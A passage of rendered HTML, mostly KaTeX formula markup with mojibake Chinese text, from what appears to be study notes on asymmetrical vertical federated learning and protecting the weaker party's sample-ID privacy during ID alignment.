0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">âˆ£</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âˆ£</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">/</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">âˆ£</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âˆ£</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ï¼Œè€Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ä¸­æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mo fence="true">âˆ£</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo fence="true">âˆ£</mo></mrow><mi mathvariant="normal">/</mi><mrow><mo fence="true">âˆ£</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">âˆ£</mo></mrow><mo>â‰«</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\left|\mathcal{I}_{1}^{o}\right| /\left|\mathcal{I}^{w}\right| \gg 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">âˆ£</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âˆ£</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">/</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">âˆ£</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âˆ£</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰«</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ã€‚</p><p>ä¸€ç§å¸¸è§çš„æƒ…å†µæ˜¯ï¼Œå»ºç«‹çš„è”é‚¦å­¦ä¹ æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> çš„å­¦ä¹ ä»»åŠ¡ã€‚çºµå‘è”é‚¦æ•°æ®åˆ†å¸ƒå¦‚å›¾2æ‰€ç¤ºï¼Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> æ˜¯è”é‚¦å­¦ä¹ ä¸­çš„å¼±æ–¹ï¼ˆweak sideï¼‰ï¼Œå› ä¸º  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">P</mi><mn>2</mn><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{P}_2^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span> ä¸­æ¯ä¸ªæ ·æœ¬çš„IDéƒ½è¢«è§†ä¸ºæ•æ„Ÿæ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨æ±‚äº¤ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> çš„è¿‡ç¨‹ä¸­å…¶éšç§ä¼šè¢«ä¸¥é‡å±å®³ã€‚åœ¨è¿™ç§<code>å¼ºå¼±è”é‚¦ï¼ˆfederation of the weak and the strongï¼‰</code>ä¸­ï¼Œæœ‰å¿…è¦åœ¨IDå¯¹é½é˜¶æ®µä¿æŠ¤å¼±æ–¹çš„IDéšç§ï¼Œè¿™ç§æ–¹æ¡ˆç§°ä¸º<code>éå¯¹ç§°çºµå‘è”é‚¦å­¦ä¹ ï¼ˆAsymmetrical Vertical Federated Learning, AVFLï¼‰</code>ã€‚</p><p>ä¸è€ƒè™‘<code>å¼±è”é‚¦ï¼ˆfederation of the weakï¼‰</code>ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å…¨ç©ºé—´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mi>w</mi></msup></mrow><annotation encoding="application/x-tex">\mathcal{I}^w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span></span></span> ç¼©å‡ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mi mathvariant="normal">\</mi><mrow><mo fence="true">(</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo>âˆª</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\mathcal{I}^{w} \backslash\left(\mathcal{I}_{1}^{o} \cup \mathcal{I}_{2}^{o}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mord">\</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆª</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span> ï¼Œä»è€Œå°†â€å¼±è”é‚¦â€œè½¬åŒ–ä¸ºâ€œå¼ºè”é‚¦â€ã€‚</p><p><em>ï¼ˆæ²¡çœ‹æ‡‚å¼±è”é‚¦è¯´çš„æ˜¯å•¥ï¼‰</em></p><p><strong>å‡è®¾1ï¼š</strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo>=</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mn>0</mn></msubsup><mo>âˆª</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathcal{I}^w=\mathcal{I}^0_1\cup \mathcal{I}_2^o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0622em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆª</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span></p><p><strong>å®šä¹‰1ï¼š</strong></p><ol><li>å¦‚æœæ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼Œåˆ™ç§°ä¸º <code>Symmetrically Vertical Federated Learning(SVFL)</code>ï¼š</li></ol><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo>âˆ’</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo>â‰¤</mo><msub><mrow><mi>log</mi><mo>â¡</mo></mrow><mn>10</mn></msub><mfrac><mrow><mo fence="true">âˆ£</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo fence="true">âˆ£</mo></mrow><mrow><mo fence="true">âˆ£</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">âˆ£</mo></mrow></mfrac><mo separator="true">,</mo><msub><mrow><mi>log</mi><mo>â¡</mo></mrow><mn>10</mn></msub><mfrac><mrow><mo fence="true">âˆ£</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo fence="true">âˆ£</mo></mrow><mrow><mo fence="true">âˆ£</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">âˆ£</mo></mrow></mfrac><mo>â‰¤</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">-\frac{1}{2} \leq \log _{10} \frac{\left|\mathcal{I}_{1}^{o}\right|}{\left|\mathcal{I}^{w}\right|}, \log _{10} \frac{\left|\mathcal{I}_{1}^{o}\right|}{\left|\mathcal{I}^{w}\right|} \leq 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord">âˆ’</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.363em;vertical-align:-0.936em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;">âˆ£</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5904em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âˆ£</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;">âˆ£</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âˆ£</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;">âˆ£</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5904em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âˆ£</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;">âˆ£</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">âˆ£</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span></span></p><ol start="2"><li><p>å¦‚æœä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ä¸­ä»»æ„ä¸€ä¸ªç­‰å¼æˆç«‹ï¼Œéƒ½å¯ä»¥ç§°ä¸º``Asymmetrical Vertical Federated Learning(AVFL)` ï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.16em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mrow><mi>log</mi><mo>â¡</mo></mrow><mn>10</mn></msub><mfrac><mrow><mo fence="true">âˆ£</mo><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo fence="true">âˆ£</mo></mrow><mrow><mo fence="true">âˆ£</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">âˆ£</mo></mrow></mfrac><mo>&lt;</mo><mo>âˆ’</mo><mfrac><mn>1</mn><mn>2</mn></mfrac></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mrow><mi>log</mi><mo>â¡</mo></mrow><mn>10</mn></msub><mfrac><mrow><mo fence="true">âˆ£</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo fence="true">âˆ£</mo></mrow><mrow><mo fence="true">âˆ£</mo><msup><mi mathvariant="script">I</mi><mi>w</mi></msup><mo fence="true">âˆ£</mo></mrow></mfrac><mo>&lt;</mo><mo>âˆ’</mo><mfrac><mn>1</mn><mn>2</mn></mfrac></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}\log _{10} \frac{\left|\mathcal{I}_{1}^{o}\right|}{\left|\mathcal{I}^{w}\right|}&lt;-\frac{1}{2} \\\log _{10} \frac{\left|\mathcal{I}_{2}^{o}\right|}{\left|\mathcal{I}^{w}\right|}&lt;-\frac{1}{2}\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.1104em;vertical-align:-1.3052em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8052em;"><span style="top:-3.8052em;"><span class="pstrut" style="height:3.0352em;"></span><span class="mord"><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">10</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0352em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span class="mtight">âˆ£</span></span><span class="mord mtight"><span class="mord mathcal mtight" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5935em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span></span></span></span></span><span class="mclose mtight delimcenter" style="top:0em;"><span class="mtight">âˆ£</span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5102em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="minner mtight"><span class="mopen mtight delimcenter" style="top:0em;"><span 